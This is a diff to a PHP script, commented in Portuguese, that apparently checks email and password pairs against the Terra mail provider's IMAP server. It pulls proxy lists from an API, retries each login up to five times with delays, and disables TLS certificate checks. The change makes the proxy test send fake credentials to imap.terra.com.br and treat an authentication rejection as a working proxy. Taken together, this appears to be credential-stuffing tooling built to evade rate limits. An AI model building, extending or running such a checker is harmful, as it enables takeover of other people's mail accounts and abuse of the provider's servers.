@@ -28,7 +28,7 @@ if ($action === 'init') {
     exit;
 }
 
-// ── TEST_PROXY — testa contra HTTPS, não IMAP ──
+// ── TEST_PROXY — testa IMAP real através do proxy ──
 if ($action === 'test_proxy') {
     $proxy = $_POST['proxy'] ?? '';
     if (empty($proxy)) { echo json_encode(['status' => 'fail', 'message' => 'Proxy vazio']); exit; }
@@ -78,21 +78,24 @@ function fetchProxiesFromApi(string $url): array {
     return $proxies;
 }
 
-// CORREÇÃO: testa HTTPS em vez de IMAP
+// CORREÇÃO: testa IMAP real através do proxy (não só HTTPS)
 function testProxyConnection(string $proxy): bool {
     if (!extension_loaded('curl')) return false;
 
-    // Testa contra api.ipify.org (mesmo que o comando curl do usuário)
+    // Testa conectando no IMAP do Terra com credenciais fake
+    // Se o proxy conseguir tunelar até a porta 993 e receber qualquer resposta
+    // do servidor IMAP, o proxy funciona para IMAP
     $ch = curl_init();
     $opts = [
-        CURLOPT_URL => 'https://api.ipify.org/',
+        CURLOPT_URL => 'imaps://imap.terra.com.br:993/INBOX',
+        CURLOPT_USERNAME => 'test@test.com',
+        CURLOPT_PASSWORD => 'test123',
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_SSL_VERIFYHOST => 0,
         CURLOPT_RETURNTRANSFER => true,
         CURLOPT_TIMEOUT => 15,
         CURLOPT_CONNECTTIMEOUT => 15,
-        CURLOPT_SSL_VERIFYPEER => false,
-        CURLOPT_SSL_VERIFYHOST => 0,
         CURLOPT_NOSIGNAL => 1,
-        CURLOPT_FOLLOWLOCATION => true,
     ];
     applyProxyOpts($proxy, $opts);
     curl_setopt_array($ch, $opts);
@@ -102,11 +105,19 @@ function testProxyConnection(string $proxy): bool {
     $err = curl_error($ch);
     curl_close($ch);
 
-    // Se recebeu um IP de volta, o proxy funciona
-    if ($result !== false && strlen(trim($result)) > 0) {
+    // Se chegou no IMAP e foi rejeitado por credenciais = proxy funciona
+    if ($errno === 67) return true;
+    // Se recebeu qualquer resposta = proxy funciona
+    if ($result !== false) return true;
+
+    $el = strtolower($err);
+    // Erros de login/auth = chegou no IMAP, proxy funciona
+    if (strpos($el, 'login') !== false || strpos($el, 'auth') !== false ||
+        strpos($el, 'denied') !== false || strpos($el, 'credential') !== false) {
         return true;
     }
 
+    // Qualquer outro erro = proxy não consegue tunelar IMAP
     return false;
 }
 
@@ -132,19 +143,16 @@ function applyProxyOpts(string $proxy, array &$opts): void {
 
 function doValidate(string $email, string $password, string $proxy = ''): array {
     $timeout = 20;
-    // 5 tentativas: 0s, 3s, 6s, 10s, 15s
     $delays = [0, 3000000, 6000000, 10000000, 15000000];
 
     for ($attempt = 0; $attempt < 5; $attempt++) {
         if ($delays[$attempt] > 0) usleep($delays[$attempt]);
 
-        // Método 1: cURL (com ou sem proxy)
         if (extension_loaded('curl')) {
             $r = tryCurl($email, $password, $timeout, $proxy);
             if ($r !== null) return $r;
         }
 
-        // Método 2: Socket (só sem proxy)
         if (empty($proxy)) {
             $r = trySocket($email, $password, $timeout);
             if ($r !== null) return $r;
